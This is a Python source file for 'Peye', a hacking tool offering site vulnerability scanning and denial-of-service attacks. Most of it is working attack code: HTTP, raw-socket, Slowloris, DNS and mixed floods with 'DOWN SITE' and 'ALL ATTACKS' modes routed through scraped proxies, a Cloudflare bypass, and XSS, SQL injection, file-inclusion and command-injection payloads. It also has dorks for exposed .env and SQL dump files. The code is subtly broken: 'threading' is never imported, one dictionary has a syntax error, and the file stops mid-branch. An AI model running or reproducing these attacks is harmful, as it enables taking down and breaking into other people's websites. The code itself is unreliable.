import requests
import time
import random
import sys
import os
import socket
import ssl
import dns.resolver
import json
import hashlib
import re
from urllib.parse import urlparse, urljoin, quote
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict

try:
    import websocket
    WEBSOCKET_AVAILABLE = True
except ImportError:
    WEBSOCKET_AVAILABLE = False

import warnings
warnings.filterwarnings('ignore')
os.system('clear')

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
RESET = '\033[0m'

def print_banner():
    banner = f"""
{RED}111111111111111111111111111111111111111111111111111111111
111111111111111111111111111111111{YELLOW}¶¶¶{RED}111111111111111111111
111111111111111111111111111111{YELLOW}¶¶¶¶{RED}11111111111111111111111
1111111111111111111111111111{YELLOW}¶¶¶¶{RED}1111111111111111111111111
11111111111111111111111111{YELLOW}¶¶¶¶¶¶{RED}1111111111111111111111111
111111111111111111111111{YELLOW}¶¶¶¶¶¶{RED}1111{YELLOW}¶¶¶{RED}11{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111
111111111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111111111
11111111111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111111111111
11111111111111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}1111
1111111111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}1111111111
111111111111111{YELLOW}¶¶¶{RED}111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}1111111
111111111111{YELLOW}¶¶¶¶¶{RED}11{YELLOW}¶¶¶¶¶¶¶¶¶¶¶{RED}11{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111111
11111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}1{YELLOW}¶¶{RED}1111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11{YELLOW}¶¶¶¶¶{RED}1111
1111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111{YELLOW}¶{RED}11111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111{YELLOW}¶¶¶¶{RED}111
11111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}1111{YELLOW}¶¶¶{RED}11
1111{YELLOW}¶¶¶¶¶¶¶¶¶{RED}111111111111111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11111{YELLOW}¶¶{RED}1
11111{YELLOW}¶¶¶¶¶{RED}111111111111111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11111111
1111111{YELLOW}¶{RED}1111111111111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}1111111
1111111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}1111111
111111111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11{YELLOW}¶¶¶¶¶{RED}1111111
11111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}1111{YELLOW}¶¶¶¶¶{RED}1111111
11111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111111{YELLOW}¶¶¶¶{RED}1111111
111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111111111{YELLOW}¶¶¶¶{RED}1111111
1111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11111111111{YELLOW}¶¶¶¶{RED}1111111
111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111{YELLOW}¶¶¶¶¶¶¶{RED}111111111111{YELLOW}¶¶¶{RED}11111111
11{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}1111111111111111111111111{YELLOW}¶¶{RED}111111111
1{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11111111111111111{YELLOW}¶¶{RED}1111111111111111111
{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111111111111111111111{YELLOW}¶¶¶¶{RED}11111111111111111
{YELLOW}¶¶¶¶¶¶¶¶¶¶{RED}1{YELLOW}¶¶¶{RED}111111111111111111111111{YELLOW}¶¶¶¶¶{RED}11111111111111
{YELLOW}¶¶¶¶¶¶¶¶¶¶{RED}11{YELLOW}¶¶{RED}11111111111111111111111111{YELLOW}¶¶¶¶¶¶¶{RED}1111111111
{YELLOW}¶¶¶¶¶¶¶¶¶¶¶{RED}111{YELLOW}¶{RED}111111111111{YELLOW}¶¶¶{RED}11111{YELLOW}¶¶¶¶{RED}111{YELLOW}¶¶¶¶¶¶¶{RED}11111111
{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶{RED}11111111111111111{YELLOW}¶¶¶{RED}11111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111111
{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11111111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}1111
{YELLOW}¶{RED}1{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11
{YELLOW}¶¶{RED}11{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶{RED}111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶{RED}1
{RED}1{YELLOW}¶{RED}11{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11111111111{YELLOW}¶¶¶¶¶¶¶¶
{RED}1111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11111111111111{YELLOW}¶¶¶¶¶¶
{RED}1111{YELLOW}¶¶¶¶¶¶{RED}1{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11{YELLOW}¶¶¶¶¶¶¶¶{RED}11111111111111{YELLOW}¶¶¶¶¶
{RED}11111{YELLOW}¶¶¶{RED}11111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11111{YELLOW}¶¶¶¶¶¶¶¶¶¶{RED}11111111111111{YELLOW}¶¶
{RED}1111{YELLOW}¶¶¶{RED}11111111{YELLOW}¶¶¶{RED}1{YELLOW}¶¶¶¶¶¶¶{RED}11111{YELLOW}¶¶¶¶¶{RED}11111111111111111{YELLOW}¶¶
{RED}1111{YELLOW}¶¶¶{RED}111111111111111{YELLOW}¶¶¶¶¶¶¶{RED}1111111{YELLOW}¶¶¶¶¶¶¶¶{RED}111111111111{YELLOW}¶
{RED}11111{YELLOW}¶¶{RED}1111111111111111111{YELLOW}¶¶¶¶¶{RED}1111111111111111111111{YELLOW}¶
{RED}111111{YELLOW}¶{RED}11111111111111111111{YELLOW}¶¶¶{RED}11111111111111111111111111
{RED}1111111111111111111111111111{YELLOW}¶¶¶{RED}11111111111111111111111111
{RED}11111111111111111111111111111{YELLOW}¶¶{RED}11111111111111111111111111
{RED}111111111111111111111111111111111111111111111111111111111
{RED}111111111111111111111111111111111111111111111111111111111{RESET}
"""
    print(banner)
    print(f"{CYAN}╔══════════════════════════════════════════════════════════════════╗")
    print(f"║     {MAGENTA} Welcome To Peye {RESET}{CYAN}                   ║")
    print(f"║     {GREEN}Tools Vuln Site Scanner Or ddos by (peyefounder) don't forget to follow: instagram: @hexornot {RESET}{CYAN}                    ║")
    print(f"╚══════════════════════════════════════════════════════════════════╝{RESET}\n")

class Stats:
    def __init__(self):
        self.total = 0
        self.success = 0
        self.failed = 0
        self.lock = threading.Lock()
    
    def add(self, success=True):
        with self.lock:
            self.total += 1
            if success:
                self.success += 1
            else:
                self.failed += 1

class WordlistManager:
    def __init__(self):
        self.wordlists = {}
        self.load_wordlists()
    
    def load_wordlists(self):
        wordlist_files = {
            'xss': 'xss.txt',
            'sqli': 'sqli.txt', 
            'lfi': 'LFI payloads.txt',
            'cmd': 'cmd.txt',
            'dirs': 'dirs.txt',
            'subdomains': 'subdomains.txt'
        }
        
        for name, filename in wordlist_files.items():
            if os.path.exists(filename):
                with open(filename, 'r') as f:
                    self.wordlists[name] = [l.strip() for l in f if l.strip() and not l.startswith('#')]
                print(f"{GREEN}[✓] Loaded {len(self.wordlists[name])} {name}{RESET}")
            else:
                self.wordlists[name] = []
                print(f"{YELLOW}[!] {filename} not found, using default{RESET}")
                self.wordlists[name] = self.get_default_payloads(name)
    
    def get_default_payloads(self, name):
        defaults = {
            'xss': ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>"],
            'sqli': ["' OR '1'='1", "' OR '1'='1' --"],
            'lfi': ["../../../../etc/passwd"],
            'cmd': ["; ls", "| whoami"],
            'dirs': ["admin", "login"],
            'subdomains': ["www", "mail"]
        }
        return defaults.get(name, [])
    
    def get(self, name):
        return self.wordlists.get(name, [])

class DorkSearch:
    def __init__(self):
        self.results = []
    
    def search_google(self, dork, max_results=50):
        print(f"{CYAN}[*] Searching: {dork}{RESET}")
        
        dorks = {
            'inurl:admin': 'Admin panel pages',
            'inurl:login': 'Login pages', 
            'inurl:wp-admin': 'WordPress admin',
            'inurl:phpmyadmin': 'phpMyAdmin panels',
            'inurl:config': 'Config files',
            'ext:sql': 'SQL dump files',
            'ext:env': 'Environment files',
            'intitle:index of': 'Directory listing'
        }
        
        if dork in dorks:
            print(f"{YELLOW}[*] Type: {dorks[dork]}{RESET}")
        
        print(f"{YELLOW}[!] Google Dork requires API key. Demo mode active.{RESET}")
        
        demo_results = [
            f"https://example.com/{dork.replace(':', '/')}",
            f"https://testsite.com/{dork.replace(':', '/')}"
        ]
        
        for url in demo_results[:max_results]:
            self.results.append(url)
            print(f"{GREEN}[✓] {url}{RESET}")
        
        return self.results
    
    def tech_search(self, tech_name):
        tech_dorks = {
            'wordpress': 'inurl:wp-content', '
            'laravel': 'inurl:.env',
            'jquery': 'inurl:jquery.js',
            'php': 'ext:php',
            'nginx': 'Server: nginx',
            'apache': 'Server: Apache',
            'admin': 'inurl:admin login'
        }
        
        if tech_name.lower() in tech_dorks:
            dork = tech_dorks[tech_name.lower()]
            print(f"{GREEN}[✓] Dork: {dork}{RESET}")
            return self.search_google(dork)
        else:
            print(f"{RED}[!] No dork for {tech_name}{RESET}")
            return []
    
    def popular_dorks(self):
        print(f"\n{CYAN}{'='*60}{RESET}")
        print(f"{YELLOW}[*] POPULAR GOOGLE DORKS{RESET}")
        print(f"{CYAN}{'='*60}{RESET}")
        
        popular = {
            'Admin Panels': 'inurl:admin OR inurl:login',
            'Config Files': 'ext:env OR ext:config',
            'Backup Files': 'ext:sql OR ext:bak',
            'Directory Listing': 'intitle:"index of"',
            'Database': 'inurl:phpmyadmin',
            'WordPress': 'inurl:wp-admin'
        }
        
        for name, dork in popular.items():
            print(f"{GREEN}[{name}]{RESET} {YELLOW}{dork}{RESET}")
        
        print(f"{CYAN}{'='*60}{RESET}")

class TechnologyDetector:
    def __init__(self, target, session):
        self.target = target
        self.session = session
        self.tech_stack = []
        self.details = {}
    
    def detect(self):
        print(f"{CYAN}[*] Scanning technology stack...{RESET}")
        
        try:
            resp = self.session.get(self.target, timeout=15)
            if resp.status_code != 200:
                print(f"{RED}[!] Cannot access {self.target} (Status: {resp.status_code}){RESET}")
                return False
            
            headers = resp.headers
            html = resp.text
            
            server = headers.get('Server', '')
            if server:
                self.tech_stack.append(f"Web Server: {server}")
            
            powered = headers.get('X-Powered-By', '')
            if powered:
                self.tech_stack.append(f"Powered By: {powered}")
            
            cms_patterns = {
                'WordPress': ['wp-content', 'wp-includes'],
                'Laravel': ['laravel', 'csrf-token'],
                'Drupal': ['drupal', 'sites/default'],
                'Joomla': ['joomla', 'com_content']
            }
            
            for cms, patterns in cms_patterns.items():
                for pattern in patterns:
                    if pattern.lower() in html.lower():
                        self.tech_stack.append(f"CMS: {cms}")
                        break
            
            js_patterns = {
                'jQuery': ['jquery', 'jQuery'],
                'React': ['react', 'ReactDOM'],
                'Vue.js': ['vue.js'],
                'Bootstrap': ['bootstrap']
            }
            
            for lib, patterns in js_patterns.items():
                for pattern in patterns:
                    if pattern.lower() in html.lower():
                        self.tech_stack.append(f"JS: {lib}")
                        break
            
        except Exception as e:
            print(f"{RED}[!] Error: {e}{RESET}")
            return False
        
        return True
    
    def display(self):
        print(f"\n{MAGENTA}{'='*60}{RESET}")
        print(f"{YELLOW}[*] TECHNOLOGY STACK: {self.target}{RESET}")
        print(f"{MAGENTA}{'='*60}{RESET}")
        
        if self.tech_stack:
            for tech in self.tech_stack:
                print(f"{GREEN}[✓] {tech}{RESET}")
        else:
            print(f"{YELLOW}[!] No technologies detected{RESET}")
        
        print(f"{MAGENTA}{'='*60}{RESET}")

class ProxyManager:
    def __init__(self, use_proxy=True):
        self.proxies = []
        self.use_proxy = use_proxy
        self.lock = threading.Lock()
    
    def scrape_proxies(self):
        if not self.use_proxy:
            return []
        proxies = []
        sources = [
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        ]
        for source in sources:
            try:
                resp = requests.get(source, timeout=10, verify=False)
                if resp.status_code == 200:
                    for line in resp.text.split('\n'):
                        line = line.strip()
                        if line and ':' in line and not line.startswith('#'):
                            if not line.startswith('http'):
                                line = f"http://{line}"
                            proxies.append(line)
            except:
                continue
        if proxies:
            self.proxies = list(set(proxies))[:200]
        return self.proxies
    
    def get(self):
        if not self.use_proxy or not self.proxies:
            return None
        with self.lock:
            return {'http': random.choice(self.proxies), 'https': random.choice(self.proxies)}

class CFBypass:
    def __init__(self, target):
        self.target = target
        self.session = None
    
    def bypass(self):
        try:
            import cloudscraper
            scraper = cloudscraper.create_scraper(browser={'browser': 'chrome', 'platform': 'windows'})
            scraper.get(self.target, timeout=15)
            return scraper
        except:
            session = requests.Session()
            session.verify = False
            session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0'})
            return session

class DoSAttack:
    def __init__(self, target, use_proxy=True):
        self.target = target
        self.use_proxy = use_proxy
        self.proxy_manager = ProxyManager(use_proxy)
        self.running = False
        self.stats = Stats()
        self.parsed = urlparse(target)
        self.host = self.parsed.netloc
        self.port = 443 if self.parsed.scheme == 'https' else 80
        self.path = self.parsed.path or '/'
        
        if use_proxy:
            self.proxy_manager.scrape_proxies()
    
    def http_flood(self, duration, threads):
        self._attack("HTTP FLOOD", duration, threads, self._http_worker)
    
    def raw_flood(self, duration, threads):
        self._attack("RAW FLOOD", duration, threads, self._raw_worker)
    
    def slowloris(self, duration, threads):
        self._attack("SLOWLORIS", duration, threads, self._slowloris_worker)
    
    def dns_attack(self, duration, threads):
        self._attack("DNS ATTACK", duration, threads, self._dns_worker)
    
    def mixed_flood(self, duration, threads):
        self._attack("MIXED", duration, threads, self._mixed_worker)
    
    def all_attacks(self, duration, threads):
        print(f"\n{RED}[!] ALL ATTACKS SIMULTANEOUS{RESET}")
        thr_each = max(1, threads // 5)
        attacks = [self.http_flood, self.raw_flood, self.slowloris, self.dns_attack, self.mixed_flood]
        for attack in attacks:
            threading.Thread(target=attack, args=(duration, thr_each)).start()
        time.sleep(duration + 2)
    
    def down_site(self, duration, threads):
        print(f"\n{RED}[!] DOWN SITE MODE | {self.target}{RESET}")
        self.all_attacks(duration, threads * 2)
    
    def _http_worker(self, end_time):
        session = requests.Session()
        session.verify = False
        while self.running and time.time() < end_time:
            try:
                proxy = self.proxy_manager.get() if self.use_proxy else None
                if proxy:
                    session.proxies = proxy
                session.get(self.target, timeout=2)
                self.stats.add(True)
            except:
                self.stats.add(False)
    
    def _raw_worker(self, end_time):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((self.host, self.port))
            if self.port == 443:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=self.host)
            payload = f"GET {self.path} HTTP/1.1\r\nHost: {self.host}\r\n\r\n".encode()
            while self.running and time.time() < end_time:
                sock.send(payload)
                self.stats.add(True)
        except:
            self.stats.add(False)
    
    def _slowloris_worker(self, end_time):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.host, self.port))
            sock.send(f"GET {self.path} HTTP/1.1\r\nHost: {self.host}\r\n".encode())
            while self.running and time.time() < end_time:
                sock.send(f"X-Header: {random.randint(1,9999)}\r\n".encode())
                time.sleep(0.3)
                self.stats.add(True)
        except:
            self.stats.add(False)
    
    def _dns_worker(self, end_time):
        while self.running and time.time() < end_time:
            try:
                dns.resolver.resolve(self.host, 'A')
                self.stats.add(True)
            except:
                self.stats.add(False)
    
    def _mixed_worker(self, end_time):
        methods = ['GET', 'POST', 'HEAD', 'DELETE', 'OPTIONS']
        session = requests.Session()
        session.verify = False
        while self.running and time.time() < end_time:
            try:
                proxy = self.proxy_manager.get() if self.use_proxy else None
                if proxy:
                    session.proxies = proxy
                method = random.choice(methods)
                if method == 'GET':
                    session.get(self.target, timeout=2)
                elif method == 'POST':
                    session.post(self.target, data={'x': 'x'*100}, timeout=2)
                elif method == 'HEAD':
                    session.head(self.target, timeout=2)
                elif method == 'DELETE':
                    session.delete(self.target, timeout=2)
                elif method == 'OPTIONS':
                    session.options(self.target, timeout=2)
                self.stats.add(True)
            except:
                self.stats.add(False)
    
    def _attack(self, name, duration, threads, worker_func):
        print(f"\n{RED}[!] {name} | {self.target}{RESET}")
        print(f"{YELLOW}[*] Duration: {duration}s | Threads: {threads} | Proxy: {'ON' if self.use_proxy else 'OFF'}{RESET}\n")
        
        self.running = True
        self.stats = Stats()
        start = time.time()
        end = start + duration
        
        for i in range(threads):
            threading.Thread(target=worker_func, args=(end,), daemon=True).start()
        
        try:
            while time.time() < end:
                time.sleep(2)
                e = time.time() - start
                rps = self.stats.total / e if e > 0 else 0
                print(f"\r{WHITE}[{CYAN}*{WHITE}] {YELLOW}Req: {self.stats.total:,} | {BLUE}RPS: {rps:.0f}{RESET}", end='', flush=True)
        except KeyboardInterrupt:
            self.running = False
        
        self.running = False
        time.sleep(1)
        e = time.time() - start
        rps = self.stats.total / e if e > 0 else 0
        print(f"\n\n{GREEN}[✓] {self.stats.total:,} req | RPS: {rps:.0f} | {e:.1f}s{RESET}\n")

class AdvancedScanner:
    def __init__(self, target, session):
        self.target = target
        self.session = session
        self.wordlists = WordlistManager()
        self.results = defaultdict(list)
        self.threads = 30
    
    def check_connection(self, url):
        """Cek koneksi sebelum scan, hanya 200 yang diproses"""
        try:
            resp = self.session.get(url, timeout=5)
            if resp.status_code == 200:
                return True, resp.status_code
            elif resp.status_code == 403:
                print(f"{RED}[✗] Access Denied (403 Forbidden) - Cannot scan{RESET}")
                return False, 403
            else:
                print(f"{YELLOW}[!] Status {resp.status_code} - Scan may be limited{RESET}")
                return False, resp.status_code
        except requests.exceptions.ConnectionError:
            print(f"{RED}[✗] Connection Failed - Cannot reach target{RESET}")
            return False, None
        except requests.exceptions.Timeout:
            print(f"{YELLOW}[!] Timeout - Target slow or blocking{RESET}")
            return False, None
        except Exception as e:
            print(f"{RED}[✗] Error: {e}{RESET}")
            return False, None
    
    def vuln_scan(self, vuln_type, payloads, param='q', indicator=None):
        print(f"\n{CYAN}[*] Scanning {vuln_type}...{RESET}")
        
        # Cek koneksi dulu
        connected, status = self.check_connection(self.target)
        if not connected:
            print(f"{RED}[✗] Cannot scan {vuln_type} - Target not accessible (Status: {status}){RESET}")
            return []
        
        found = []
        total = len(payloads)
        
        for i, payload in enumerate(payloads[:30], 1):
            test_url = self.target + (('?' + param + '=' + quote(payload)) if '?' not in self.target else ('&' + param + '=' + quote(payload)))
            try:
                resp = self.session.get(test_url, timeout=5)
                
                if resp.status_code == 200:
                    if indicator and indicator in resp.text:
                        found.append(payload)
                        print(f"{RED}[!] {vuln_type} VULNERABLE: {payload[:50]}{RESET}")
                    elif not indicator and len(resp.content) > 500:
                        print(f"{YELLOW}[?] {vuln_type} Possible: {payload[:50]}{RESET}")
                        found.append(payload)
                elif resp.status_code == 403:
                    print(f"{YELLOW}[!] {vuln_type} test blocked (403) - {payload[:30]}{RESET}")
                elif resp.status_code == 404:
                    pass  # Silent skip 404
                else:
                    print(f"{YELLOW}[?] {vuln_type} test status {resp.status_code}{RESET}")
                    
            except requests.exceptions.Timeout:
                print(f"{YELLOW}[!] Timeout on {vuln_type} test{RESET}")
            except:
                pass
            
            # Progress
            if i % 10 == 0:
                print(f"{WHITE}[*] Progress: {i}/{total}{RESET}", end='\r')
        
        print(f"\n{GREEN}[✓] {vuln_type} scan complete: {len(found)} findings{RESET}")
        self.results[vuln_type] = found
        return found
    
    def dir_scan(self):
        print(f"\n{CYAN}[*] Directory Bruteforce...{RESET}")
        
        # Cek koneksi
        connected, status = self.check_connection(self.target)
        if not connected:
            print(f"{RED}[✗] Cannot scan directories - Target not accessible{RESET}")
            return []
        
        dirs = self.wordlists.get('dirs')
        found = []
        
        for d in dirs[:50]:
            url = urljoin(self.target, d)
            try:
                resp = self.session.get(url, timeout=3, allow_redirects=False)
                
                if resp.status_code == 200:
                    found.append(url)
                    print(f"{GREEN}[✓] {url} -> 200 OK{RESET}")
                elif resp.status_code == 301 or resp.status_code == 302:
                    location = resp.headers.get('Location', '')
                    print(f"{BLUE}[→] {url} -> {resp.status_code} redirect to {location}{RESET}")
                elif resp.status_code == 403:
                    print(f"{YELLOW}[!] {url} -> 403 Forbidden (Blocked){RESET}")
                elif resp.status_code == 404:
                    pass  # Silent
                else:
                    print(f"{YELLOW}[?] {url} -> {resp.status_code}{RESET}")
                    
            except requests.exceptions.Timeout:
                print(f"{YELLOW}[!] Timeout: {url}{RESET}")
            except:
                pass
        
        print(f"{GREEN}[✓] Directory scan complete: {len(found)} found{RESET}")
        return found
    
    def subdomain_scan(self, domain):
        print(f"\n{CYAN}[*] Subdomain Scan...{RESET}")
        subs = self.wordlists.get('subdomains')
        found = []
        
        for sub in subs:
            url = f"{sub}.{domain}"
            try:
                ip = socket.gethostbyname(url)
                found.append(url)
                print(f"{GREEN}[✓] {url} -> {ip}{RESET}")
            except socket.gaierror:
                pass  # Subdomain doesn't exist
            except:
                print(f"{YELLOW}[!] Error checking {url}{RESET}")
        
        print(f"{GREEN}[✓] Subdomain scan complete: {len(found)} found{RESET}")
        return found
    
    def full_scan(self):
        print(f"\n{MAGENTA}{'='*60}{RESET}")
        print(f"{YELLOW}[*] FULL SCAN: {self.target}{RESET}")
        print(f"{MAGENTA}{'='*60}{RESET}")
        
        # Test main target first
        connected, status = self.check_connection(self.target)
        if not connected:
            print(f"{RED}[✗] Target unreachable, aborting scan{RESET}")
            return
        
        self.vuln_scan('XSS', self.wordlists.get('xss'), 'q', '<script>')
        self.vuln_scan('SQLi', self.wordlists.get('sqli'), 'id', 'mysql|syntax')
        self.vuln_scan('LFI', self.wordlists.get('lfi'), 'file', 'root:')
        self.vuln_scan('CMD', self.wordlists.get('cmd'), 'cmd', 'uid=')
        self.dir_scan()
        
        print(f"\n{MAGENTA}{'='*60}{RESET}")
        print(f"{YELLOW}[*] SCAN SUMMARY{RESET}")
        print(f"{MAGENTA}{'='*60}{RESET}")
        total = 0
        for vuln, findings in self.results.items():
            if findings:
                print(f"{RED}[!] {vuln}: {len(findings)} potential vulnerabilities{RESET}")
                total += len(findings)
        if total == 0:
            print(f"{GREEN}[✓] No vulnerabilities detected{RESET}")
        print(f"{MAGENTA}{'='*60}{RESET}")
        return self.results

class Peye:
    def __init__(self):
        self.use_proxy = True
        self.dork = DorkSearch()
    
    def menu(self):
        proxy_status = "ON" if self.use_proxy else "OFF"
        print(f"""
{YELLOW}╔══════════════════════════════════════════════════════════════════╗
║ {GREEN} PEYE Tools (Proxy: {proxy_status}){RESET}{YELLOW}                                         ║
╠══════════════════════════════════════════════════════════════════╣
║ {MAGENTA}[📊 SCANNER]{RESET}{YELLOW}                                                       ║
║ {CYAN}[1] {WHITE}Full Vulnerability Scan (XSS/SQLi/LFI/CMD)                       ║
║ {CYAN}[2] {WHITE}Directory Bruteforce                                             ║
║ {CYAN}[3] {WHITE}Subdomain Scanner                                                ║
║ {CYAN}[4] {WHITE}Technology Stack Detection                                       ║
║ {CYAN}[5] {WHITE}XSS Scanner                                                     ║
║ {CYAN}[6] {WHITE}SQLi Scanner                                                    ║
║ {CYAN}[7] {WHITE}LFI Scanner                                                     ║
║ {CYAN}[8] {WHITE}Command Injection Scanner                                       ║
╠══════════════════════════════════════════════════════════════════╣
║ {MAGENTA}[🔍 DORK SEARCH]{RESET}{YELLOW}                                                    ║
║ {CYAN}[9] {WHITE}Search with Google Dork                                         ║
║ {CYAN}[10] {WHITE}Search by Technology                                            ║
║ {CYAN}[11] {WHITE}Show Popular Dorks                                              ║
╠══════════════════════════════════════════════════════════════════╣
║ {MAGENTA}[💥 DoS ATTACK]{RESET}{YELLOW}                                                     ║
║ {CYAN}[12] {WHITE}HTTP Flood              [13] {WHITE}Raw Socket Flood                   ║
║ {CYAN}[14] {WHITE}Slowloris               [15] {WHITE}DNS Attack                        ║
║ {CYAN}[16] {WHITE}Mixed Methods Flood     [17] {WHITE}ALL ATTACKS                       ║
║ {CYAN}[18] {WHITE}DOWN SITE                                            ║
╠══════════════════════════════════════════════════════════════════╣
║ {CYAN}[P] {WHITE}Toggle Proxy (Current: {proxy_status})                                    ║
║ {CYAN}[0] {WHITE}Exit                                                           ║
╚══════════════════════════════════════════════════════════════════╝{RESET}
""")
    
    def run(self):
        print_banner()
        
        while True:
            self.menu()
            choice = input(f"{GREEN}\n> {RESET}").upper()
            
            if choice == '0':
                sys.exit(0)
            
            if choice == 'P':
                self.use_proxy = not self.use_proxy
                print(f"{GREEN}[✓] Proxy: {'ON' if self.use_proxy else 'OFF'}{RESET}")
                time.sleep(1)
                os.system('clear')
                print_banner()
                continue
            
            # Scanner options
            if choice in ['1','2','3','4','5','6','7','8']:
                target = input(f"{GREEN}Target URL: {RESET}").strip()
                if not target.startswith(('http://','https://')):
                    target = 'http://' + target
                
                print(f"{YELLOW}[*] Connecting to {target}...{RESET}")
                session = CFBypass(target).bypass()
                scanner = AdvancedScanner(target, session)
                
                # Test connection first
                connected, status = scanner.check_connection(target)
                if not connected:
                    if status == 403:
                        print(f"{RED}[✗] Access Denied (403) - Target is blocking us{RESET}")
                    else:
                        print(f"{RED}[✗] Cannot reach target{RESET}")
                    input(f"\n{YELLOW}Enter to continue{RESET}")
                    os.system('clear')
                    print_banner()
                    continue
                
                print(f"{GREEN}[✓] Connection OK (Status: {status}){RESET}")
                
                if choice == '1':
                    scanner.full_scan()
                elif choice == '2':
                    scanner.dir_scan()
                elif choice == '3':
                    domain = urlparse(target).netloc
                    scanner.subdomain_scan(domain)
                elif choice == '4':
                    detector = TechnologyDetector(target, session)
                    if detector.detect():
                        detector.display()
                    else:
                        print(f"{RED}[✗] Failed to detect technology{RESET}")
                elif choice == '5':
                    scanner.vuln_scan('XSS', scanner.wordlists.get('xss'), 'q', '<script>')
                elif choice == '6':
                    scanner.vuln_scan('SQLi', scanner.wordlists.get('sqli'), 'id', 'mysql|syntax')
                elif choice == '7':
                    scanner.vuln_scan('LFI', scanner.wordlists.get('lfi'), 'file', 'root:')
                elif choice == '8':
                    scanner.vuln_scan('CMD', scanner.wordlists.get('cmd'), 'cmd', 'uid=')
            
            # Dork search options
            elif choice == '9':
                dork = input(f"{GREEN}Enter Google Dork: {RESET}")
                self.dork.search_google(dork)
                print(f"\n{GREEN}[✓] Found {len(self.dork.results)} demo results{RESET}")
            
            elif choice == '10':
                tech = input(f"{GREEN}Enter technology (wordpress/laravel/php/jquery/nginx/apache/admin): {RESET}")
                self.dork.tech_search(tech)
                print(f"\n{GREEN}[✓] Found {len(self.dork.results)} demo results{RESET}")
            
            elif choice == '11':
                self.dork.popular_dorks()
            
            # DoS Attack options
            elif choice in ['12','13','14','15','16','17','18']:
                target = input(f"{GREEN}Target URL: {RESET}").strip()
                if not target.startswith(('http://','https://')):
                    target = 'http://' + target
                
